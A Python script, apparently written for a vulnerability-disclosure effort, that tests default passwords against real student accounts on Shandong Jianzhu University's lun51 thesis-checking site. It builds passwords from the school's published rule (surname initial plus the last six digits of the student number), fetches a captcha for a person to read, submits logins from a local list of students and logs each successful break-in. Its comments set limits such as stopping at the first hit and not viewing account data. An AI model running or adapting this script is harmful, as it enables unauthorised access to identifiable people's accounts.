# -*- coding: utf-8 -*-
"""lun51（山东建筑大学）确定规则的最小登录验证器。

规则：账号=学号，密码=姓氏拼音首字母大写 + 学号后6位（学校一手通知）。
接口（浏览器实测）：
  GET  https://sdjzu.lun51.com/logic/authority/                       -> _ajax_id / o_lun51_key
  GET  https://sdjzu.lun51.com/logic/authority/get?o_lun51_key=<k>&t= -> 验证码图
  POST https://sdjzu.lun51.com/logic/account/um_user/login/
       account=YJS.SDJZU:<学号>&password=<密码>&_ajax_id=<k>&o_lun51_key=<k>&authorityCode=<验证码>

用法：
  python _lun51_verify.py --prepare                 # 取会话+验证码图，交给人识别
  python _lun51_verify.py --code ABCD12 --row 1    # 提交第 1 行主密码
  python _lun51_verify.py --code ABCD12 --row 1 --variant   # 提交备用密码

红线：验证码由人识别，脚本不识别不绕过；单账号最多 2 组；命中即停；
      不看登录后的论文/个人信息，只判返回码；真实姓名学号只存本地。
"""
import argparse, csv, json, os, sys, time
import requests, urllib3

urllib3.disable_warnings()

BASE = "https://sdjzu.lun51.com"
ENTRY = BASE + "/yjs"
SYS = BASE + "/logic/authority/"
SYS_GET = BASE + "/logic/authority/get"
LOGIN = BASE + "/logic/account/um_user/login/"
TENANT = "YJS.SDJZU"

SCAN = r"E:\kimi\scan"
CSV_PATH = os.path.join(SCAN, "确定规则_lun51凭据表_20261111.csv")
SESS = os.path.join(SCAN, "lun51_session.json")
CAPTCHA = os.path.join(SCAN, "lun51_captcha.png")
RESULT = os.path.join(SCAN, "fofa_pool", "lun51_verify_results_20261111.json")


def new_session():
    s = requests.Session()
    s.trust_env = False
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124",
        "Referer": ENTRY,
        "X-Requested-With": "XMLHttpRequest",
    })
    return s


def prepare():
    s = new_session()
    s.get(ENTRY, timeout=15, verify=False)
    r = s.get(SYS, timeout=15, verify=False)
    key = r.text.strip()
    if not key or len(key) < 16:
        print("取 authority key 失败:", r.status_code, r.text[:120])
        return
    img = s.get(SYS_GET, params={"o_lun51_key": key, "t": int(time.time() * 1000)},
                timeout=15, verify=False)
    ctype = img.headers.get("Content-Type", "")
    ext = ".png" if "png" in ctype else (".jpg" if "jpeg" in ctype or "jpg" in ctype else ".bin")
    path = CAPTCHA if ext == ".png" else CAPTCHA.replace(".png", ext)
    open(path, "wb").write(img.content)
    cookies = requests.utils.dict_from_cookiejar(s.cookies)
    json.dump({"key": key, "cookies": cookies, "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
               "captcha_file": path, "captcha_ctype": ctype},
              open(SESS, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    print("会话已就绪 | key =", key[:16] + "...")
    print("验证码图:", path, "|", ctype, "|", len(img.content), "B")
    print("请把图上字符作为 --code 传回来（每次 prepare 会换一张图，需及时使用）")


def verify(code, row_no, variant=False):
    if not os.path.isfile(SESS):
        print("请先 --prepare")
        return
    d = json.load(open(SESS, encoding="utf-8"))
    rows = list(csv.DictReader(open(CSV_PATH, encoding="utf-8-sig")))
    if row_no < 1 or row_no > len(rows):
        print("行号超出范围 1..%d" % len(rows))
        return
    r = rows[row_no - 1]
    pwd = r["备用密码(英文名首字母变体)"] if variant else r["主密码(官方规则)"]
    if not pwd:
        print("该行无此候选密码")
        return
    s = new_session()
    s.cookies = requests.utils.cookiejar_from_dict(d["cookies"])
    data = {
        "account": TENANT + ":" + r["学号"],
        "password": pwd,
        "_ajax_id": d["key"],
        "o_lun51_key": d["key"],
        "authorityCode": code,
    }
    resp = s.post(LOGIN, data=data, timeout=20, verify=False)
    try:
        j = resp.json()
    except Exception:
        j = {"raw": resp.text[:300]}
    jcode = str(j.get("code", ""))
    msg = (j.get("msg") or j.get("message") or "")[:120]
    verdict = "命中" if jcode in ("0", "200") else (
        "验证码错误" if ("验证码" in msg or "code" in jcode.lower()) else "失败")
    print("HTTP", resp.status_code, "| code", jcode, "| msg", msg, "| 判定", verdict)
    print("账号", r["学号"], "| 规则", "备用(名首字母)" if variant else "主(姓首字母)")

    # 回填 CSV（只记判定与规则，不记验证码、不记真实口令明文）
    r["状态(你填)"] = verdict
    r["录屏/结果(你填)"] = "%s %s｜规则=%s｜返回code=%s" % (
        time.strftime("%Y-%m-%d %H:%M:%S"), verdict,
        "备用" if variant else "主", jcode)
    with open(CSV_PATH, "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)

    hist = []
    if os.path.isfile(RESULT):
        try:
            hist = json.load(open(RESULT, encoding="utf-8"))
        except Exception:
            hist = []
    hist.append({"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "row": row_no,
                 "sid": r["学号"], "rule": "备用" if variant else "主",
                 "verdict": verdict, "code": jcode, "msg": msg,
                 "note": "不含验证码与口令明文"})
    json.dump(hist, open(RESULT, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    if verdict == "命中":
        print(">>> 命中！立即停机、录屏留证，按 §6 六件套出报送包 <<<")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--prepare", action="store_true")
    ap.add_argument("--code", default="")
    ap.add_argument("--row", type=int, default=1)
    ap.add_argument("--variant", action="store_true")
    a = ap.parse_args()
    if a.prepare:
        prepare()
    elif a.code:
        verify(a.code, a.row, a.variant)
    else:
        ap.print_help()
